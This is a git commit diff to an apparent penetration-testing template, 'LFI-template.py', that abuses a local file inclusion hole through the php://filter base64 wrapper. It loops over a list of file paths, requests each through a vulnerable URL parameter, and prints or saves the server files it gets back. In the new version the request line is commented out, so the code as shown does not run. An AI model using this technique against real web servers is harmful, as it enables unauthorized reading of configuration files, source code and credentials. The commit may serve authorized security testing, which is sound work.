4fa7d4e0ae145520433de19881475babad644cad
Antti Virtanen <antti.virtanen@solita.fi>
2019-01-07 15:04:52 +0200

    better LFI template code

--- src/LFI-template.py
+++ src/LFI-template.py
@@ -7,8 +7,6 @@ import argparse
 
 parser = argparse.ArgumentParser(description='Abuse LFI through PHP filters')
 parser.add_argument('url', type=str, help='URL including the vulnerable parameter at the end')
-parser.add_argument('begin', type=str, default="[(")
-parser.add_argument('end', type=str, default=")]")
 args = parser.parse_args()
 
 
@@ -21,20 +19,16 @@ with open('files.txt') as f:
 print(files)
 print("\n-----")
 
-# TODO: replace with the appropriate code the exploit this particular vulnerability
-def exploitLFI(URL, begin, end):
-  repla = requests.get(URL + "php://filter/read=convert.base64-encode/resource=" + urllib.quote_plus(lfi))
+# TODO: replace with the appropriate code the exploit this particular vulnerability                                                                                                                             
+def exploitLFI(URL, filename):
+#  repla = requests.get(URL + "php://filter/read=convert.base64-encode/resource=" + urllib.quote_plus(filename))                                                                                                 
   if (repla.status_code == 200):
-    base64encoded = repla.text.split(begin)[1]
-    base64encoded = base64encoded.split(end)[0]
-    print("FILE : " + lfi)
-    content=base64.b64decode(base64encoded)
-    print(content)
-    with open(fn, "w") as f:
-      f.write(content)
-      print("---------------")
-    else:
-      print("STATUS : " + str(repla.status_code))
+    print("FILE : " + filename)
+    print(repla.text)
+    print("---------------")
+  else:
+    print("STATUS : " + str(repla.status_code))
+  return repla
 
 count = 0
 for lfi in files:
@@ -42,6 +36,9 @@ for lfi in files:
     time.sleep(0.05)
     fn = lfi.split("/")[-1] + ".BAR"
     if (not (os.path.isfile(fn))):
-      exploitLFI(args.url, args.begin, args.end)
+      reply = exploitLFI(args.url, lfi)
+      # TODO: to write files locally for later examination, do something here.
+      #    with open(fn, "w") as f:                                                                                                                                                                               
+      #      f.write(reply.text)                                                                                                                                                                                  
     count = count + 1
 
